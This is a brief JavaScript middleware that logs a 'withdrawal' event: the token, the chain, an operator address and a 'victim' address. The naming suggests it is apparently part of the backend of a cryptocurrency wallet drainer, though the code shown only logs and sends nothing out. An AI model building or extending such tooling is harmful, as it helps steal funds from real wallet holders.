import logger from "../utils/logger.js";

const withdrawal = async (req, res, next) => {
  const { event, ...payload } = req.body;

  const now = new Date();
  const date = now.toLocaleString();

  const token = payload.token;
  const chain = payload.chain;
  const oprator_address = payload.randomAddress;
  const victim_address = payload.victimAddress;

  console.log(`\n\n${"=".repeat(10)} (${date}) ${"=".repeat(10)}\n`);

  logger.info("Event", event);
  logger.info("Oprator Address", oprator_address);
  logger.info("Victim Address", victim_address);
  logger.info("Token Name", token.name);
  logger.info("Chain", chain.name);
  logger.info("Token Symbol", token.symbol);
  logger.info("Token Address", token.id);

  next();
};

export default withdrawal;
